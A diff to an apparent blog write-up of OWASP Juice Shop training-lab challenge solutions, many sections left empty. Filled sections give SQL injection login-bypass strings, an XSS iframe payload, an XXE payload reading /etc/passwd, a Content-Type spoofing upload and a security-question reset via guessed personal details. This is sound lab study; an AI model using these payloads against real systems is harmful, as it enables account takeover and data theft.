@@ -2,40 +2,69 @@
 layout: post
 title: OWASP Juice Shop v9.3.1 - 3 Star Solutions
 ---
-# OWASP Juice Shop: 3 Star
+
 ## API-only XSS
 ### Perform a persisted XSS attack with ```<iframe src="javascript:alert(`xss`)">``` without using the frontend application at all.
+
+
 
 ## Admin Registration
 ### Register as a user with administrator privileges.
 
+
+
 ## Bjoern's Favorite Pet
 ### Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.
+
+
 
 ## CAPTCHA Bypass
 ### Submit 10 or more customer feedbacks within 10 seconds.
 
+
+
 ## Client-side XSS Protection
 ### Perform a persisted XSS attack with ```<iframe src="javascript:alert(`xss`)">``` bypassing a client-side security mechanism.
+
+
+
 
 ## Database Schema
 ### Exfiltrate the entire DB schema definition via SQL Injection.
 
+
+
+
 ##  Forged Feedback
 ### Post some feedback in another users name.
+
 Logged in as admin through SQL injection, submitted comment in Contact Us form at http://10.10.50.111/#/contact.
+
+
+
 
 ## Forged Review
 ### Post a product review as another user or edit any user's existing review.
 
+
+
+
 ## GDPR Data Erasure
 ### Log in with Chris' erased user account.
+
+Inject ```' OR 1=1 AND email like('%chris%');--``` into login form. Account: chris.pike@juice-sh.op
+
 
 ## Login Amy
 ### Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")
 
+
+
+
 ## Login Bender
 ### Log in with Bender's user account.
+
+Login using the following injection: ```' or 1=1 and email like('%bender%');--```
 
 ##  Login Jim
 ### Log in with Jim's user account.
@@ -43,30 +72,92 @@ From password reset,
 User: jim@juice-sh.op
 Pass: pass1
 
+OR, ```' or 1=1 and email like('%jim%');--```
+
+
 ## Manipulate Basket
 ### Put an additional product into another user's shopping basket.
+
+
+
 
 ## Payback Time
 ### Place an order that makes you rich.
 
+
+
+
 ## Privacy Policy Inspection
 ### Prove that you actually read our privacy policy.
+
+Click the link on the Privacy Policy page.
+![free_privacy_policy](/images/juice/free_privacy_policy.png)
+
+
 
 ## Product Tampering
 ### Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.
 
+
+
+
 ##  Reset Jim's Password
 ### Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.
+
 After submitting feedback, we see in the customer feedback section of the /administration site that the comments made by admin are signified by User 1. We also see the first review seems to be a fake one written by the admin. Following the email chart, we assume User 2 is jim (jim@juice-sh.op). From the Recycling Requests table, we learn his address is Starfleet HQ so this jim may in fact be James Tiberius Kirk. From a quick wiki search, we learn James has a brother named George Samuel Kirk. We enter Samuel into the Forgot Password recovery question "Your eldest siblings middle name?", and set a new password "pass1".
+
 
 
 ## Upload Size
 ### Upload a file larger than 100 kB.
 
+
+
+
+
+
+
+
 ## Upload Type
 ### Upload a file that has no .pdf or .zip extension.
+
+When uploading a test pdf file called ```test.pdf```, some headers are as follows: 
+```
+Content-Disposition: form-data; name="file"; filename="test.pdf"
+Content-Type: application/pdf
+```
+
+The body of the request contains the raw file.
+
+```
+%PDF-1.5 %ÐÔÅØ 5 0 obj << /Length 79         /Filter /FlateDecode >> stream xÚs
+[...]
+```
+
+My assumption, which proved correct, was that I could keep the Content-Type in the header the same and change the raw contents of the file (and even the filename) to upload something in non-pdf format.
+
+```
+------WebKitFormBoundaryHv1OBRtF
+Content-Disposition: form-data; name="file"; filename="new_cool.notpdf"
+Content-Type: application/pdf
+
+Hello, nice to see ya.
+
+------WebKitFormBoundaryHv1OBRtF--
+```
+
+
 
 ### XXE Data Access
 ### Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server.
 
+I looked up [XML External Entity (XXE) Processing RCE examples](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) and created ini.xml in their image:
 
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+```
+
+![xml_err](/images/juice/xml_err.png)
